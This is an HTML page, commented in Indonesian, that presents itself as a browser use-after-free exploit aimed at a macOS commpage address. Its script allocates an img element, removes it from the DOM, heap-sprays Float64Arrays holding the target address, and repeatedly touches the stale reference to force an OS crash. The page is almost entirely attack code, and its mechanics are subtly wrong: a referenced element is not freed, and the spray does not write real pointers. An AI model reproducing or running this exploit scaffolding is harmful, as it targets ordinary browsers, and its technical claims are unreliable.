<!DOCTYPE html>
<html>
<head>
    <title>UAF Commpage Register Control</title>
    <style>
        /* Gaya CSS */
    </style>
</head>
<body>

    <h1>UAF Register Control Experiment (Targeting Commpage Address)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Siap memulai UAF...</p>
    <div id="log"></div>

    <script>
        // --- KONSTANTA COMM PAGE (DARI PANDUAN APPLE) ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; // 0x0000000FFFFFC320
        
        // Pemisahan 64-bit address menjadi dua 32-bit words (untuk injeksi ke memori)
        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Untuk userspace, ini 0.

        let victimPointer = null; // Pointer yang akan kita buat menjadi "dangling"
        let sprayHolders = [];    // Array untuk mencegah Payload di-GC
        let isCrashed = false;

        function log(message) {
            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
        }

        // 1. ALLOCATION (Fase Membuat Objek Target)
        function phase1_Allocate() {
            // Membuat objek yang kompleks di heap yang mungkin memiliki pointer C++
            victimPointer = document.createElement('img');
            victimPointer.id = 'victim';
            document.body.appendChild(victimPointer);
            log("Phase 1: Objek Target (img) dibuat.");
        }

        // 2. FREE (Fase Menciptakan Lubang Memori)
        function phase2_Free() {
            // Hapus objek dari DOM (ini memicu C++ destructor dan free memori)
            if (victimPointer && victimPointer.parentNode) {
                victimPointer.parentNode.removeChild(victimPointer);
                // NAMUN, kita TIDAK menghapus 'victimPointer' di JavaScript.
                // victimPointer sekarang adalah 'dangling pointer' (UAF).
                log("Phase 2: Objek Target dihapus dari DOM (FREE). Lubang memori dibuat.");
            }
        }

        // 3. RE-ALLOCATE (Fase Mengisi Lubang dengan Payload)
        function phase3_SprayPayload() {
            const SPRAY_COUNT = 500; // Jumlah array yang banyak untuk memastikan kita menimpa lubang
            const SPRAY_SIZE = 12;   // Ukuran yang disesuaikan untuk menimpa objek DOM

            for (let i = 0; i < SPRAY_COUNT; i++) {
                // Gunakan DataView/Float64Array karena ukurannya stabil dan dapat menyimpan 64-bit values.
                let payloadArray = new Float64Array(SPRAY_SIZE);
                
                // Masukkan ALAMAT COMM PAGE ke array
                // Kita berharap data ini sekarang menggantikan struktur C++ dari objek 'img' yang sudah di-free.
                payloadArray[0] = HIGH_WORD; // Bagian atas 
                payloadArray[1] = LOW_WORD;  // Bagian bawah (Target Address: 0xFFFFC320)
                payloadArray[2] = 7331.0;    // Nilai acak pengisi

                // Simpan referensi payload
                sprayHolders.push(payloadArray); 
            }
            log(`Phase 3: Heap Spraying dengan ${SPRAY_COUNT} Payload (0x...C320).`);
        }

        // 4. TRIGGER (Fase Memanfaatkan UAF)
        function phase4_TriggerUAF() {
            if (isCrashed) return;

            // Sekarang kita mencoba menggunakan 'victimPointer' yang seharusnya sudah mati,
            // tetapi kini menunjuk ke Payload yang berisi alamat Commpage.
            try {
                // Akses properti yang akan memicu dereferensi pointer C++ internal
                // Pointer internal ini sekarang berisi TARGET_CONTROL_ADDRESS (0x0000000FFFFFC320)
                // CPU akan mencoba mengakses memori di 0x0000000FFFFFC320, yang berisi _COMM_PAGE_ASB_TARGET_VALUE
                log("Phase 4: Memicu UAF Dereference (Mencoba mengakses memori Commpage)...");
                
                // Mengakses properti 'align' pada objek img sering memicu dereferensi pointer
                victimPointer.align = "crash"; 

            } catch (e) {
                // Menangani error JS (tetapi crash yang kita cari adalah crash OS/Segfault)
                log("Error: " + e.message + " - Crash OS diharapkan, BUKAN error JS.");
            }
            
            // Jaga agar referensi tetap ada (jangan segera hapus sprayHolders)
        }
        
        // --- URUTAN EKSEKUSI ---
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian UAF...';
            
            // 1. Alokasi
            setTimeout(phase1_Allocate, 100);
            
            // 2. Free
            setTimeout(phase2_Free, 200);
            
            // 3. Re-allocate / Spray Payload
            setTimeout(phase3_SprayPayload, 300);
            
            // 4. Trigger (Lakukan berulang kali untuk stabilitas)
            // Timeout yang singkat sangat penting untuk timing yang pas (race condition)
            for (let i = 0; i < 50; i++) {
                 setTimeout(phase4_TriggerUAF, 400 + (i * 10));
            }
            
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tunggu Crash.';
        });

    </script>
</body>
</html>
